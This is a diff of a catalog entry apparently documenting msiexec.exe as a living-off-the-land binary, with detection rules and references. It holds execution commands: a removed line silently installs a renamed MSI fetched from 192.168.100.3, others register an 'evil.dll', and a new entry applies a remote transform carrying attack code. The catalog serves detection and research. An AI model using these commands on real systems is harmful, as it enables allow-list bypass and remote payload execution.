@@ -1,54 +1,74 @@
 ---
 Name: Msiexec.exe
 Description: Used by Windows to execute msi files
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: msiexec /quiet /i cmd.msi
+  - Command: msiexec /quiet /i {PATH:.msi}
     Description: Installs the target .MSI file silently.
     Usecase: Execute custom made msi file with attack code
     Category: Execute
     Privileges: User
     MitreID: T1218.007
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-  - Command: msiexec /q /i http://192.168.100.3/tmp/cmd.png
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: MSI
+  - Command: msiexec /q /i {REMOTEURL}
     Description: Installs the target remote & renamed .MSI file silently.
     Usecase: Execute custom made msi file with attack code from remote server
     Category: Execute
     Privileges: User
     MitreID: T1218.007
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-  - Command: msiexec /y "C:\folder\evil.dll"
-    Description: Calls DLLRegisterServer to register the target DLL.
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: MSI
+      - Execute: Remote
+  - Command: msiexec /y {PATH_ABSOLUTE:.dll}
+    Description: Calls DllRegisterServer to register the target DLL.
     Usecase: Execute dll files
     Category: Execute
     Privileges: User
     MitreID: T1218.007
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-  - Command: msiexec /z "C:\folder\evil.dll"
-    Description: Calls DLLRegisterServer to un-register the target DLL.
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: DLL
+      - Execute: Remote
+  - Command: msiexec /z {PATH_ABSOLUTE:.dll}
+    Description: Calls DllUnregisterServer to un-register the target DLL.
     Usecase: Execute dll files
     Category: Execute
     Privileges: User
     MitreID: T1218.007
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: DLL
+      - Execute: Remote
+  - Command: msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS="{REMOTEURL:.mst}" /qb
+    Description: Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input.
+    Usecase: Install trusted and signed msi file, with additional attack code as transformation file, from a remote server
+    Category: Execute
+    Privileges: User
+    MitreID: T1218.007
+    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: MSI
+      - Execute: MST
+      - Execute: Remote
 Full_Path:
   - Path: C:\Windows\System32\msiexec.exe
   - Path: C:\Windows\SysWOW64\msiexec.exe
-Code_Sample:
-  - Code:
 Detection:
-  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_msiexec_web_install.yml
-  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_msiexec_cwd.yml
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_web_install.yml
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_masquerading.yml
   - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
   - Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/uninstall_app_using_msiexec.yml
   - IOC: msiexec.exe retrieving files from Internet
 Resources:
   - Link: https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
   - Link: https://twitter.com/PhilipTsukerman/status/992021361106268161
+  - Link: https://badoption.eu/blog/2023/10/03/MSIFortune.html
 Acknowledgement:
   - Person: netbiosX
     Handle: '@netbiosX'
   - Person: Philip Tsukerman
     Handle: '@PhilipTsukerman'
----
